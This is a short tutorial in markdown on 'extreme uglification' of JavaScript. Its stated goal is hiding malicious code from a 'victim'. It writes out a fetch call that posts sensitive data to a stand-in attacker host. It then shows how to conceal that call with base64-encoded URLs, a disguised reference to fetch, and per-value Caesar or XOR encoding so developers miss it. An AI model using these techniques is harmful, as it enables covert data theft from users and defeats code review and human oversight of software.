# STFWP - JavaScript

### Tricks

##### EXTREME-UGLIFICATION of your code
JavaScript being an interpreted language means it is really easy to read the code being executed. So, uglify your code. But even then its is readable. So, uglify it EXTREMELY by encrypting or encoding it to garbage. Doing it to the entire file can be a dead giveaway tho so you can instead just encrypt parts of the file that are easily readable. There are many ways to do this. Heres what I mean by this.

Heres your dangerously dangerous code -
```javascript
fetch('http://dangerously-dangerous.com/something', { method: 'post', body: { sensitive: 'info' } });
```

Looking at that you know that this will make a dangerously dangerous api call to possibly steal some sensitive info. Lets hide the url.

There are many ways to make it less readable. One of them is atob (base64)

So now it'll look like this
```javascript
fetch(atob('aHR0cDovL2Rhbmdlcm91c2x5LWRhbmdlcm91cy5jb20vc29tZXRoaW5n'), { method: 'post', body: { sensitive: 'info' } });
```

But its still pretty clear that the snippet is making an api call. Let's take it a step further i.e. TOO-EXTREME-TO-HANDLE-UGLIFICATION

```javascript
const _ = atob;
window[_('ZmV0Y2g=')](_('aHR0cDovL2Rhbmdlcm91c2x5LWRhbmdlcm91cy5jb20vc29tZXRoaW5n'), { method: 'post', body: { sensitive: 'info' } });
```

Now guess what that code does. Now stop guessing because you already know the answer. But your victim won't.

Instead of base64, you can also use a simple ceaser cipher or xor encryption algorithms. And to take it a step further, use a different key for each of the values. You can also use jsfuck but I don't reccommend it as it will make it easy for a developer to recognize whats happening and can un-jsfuck it.
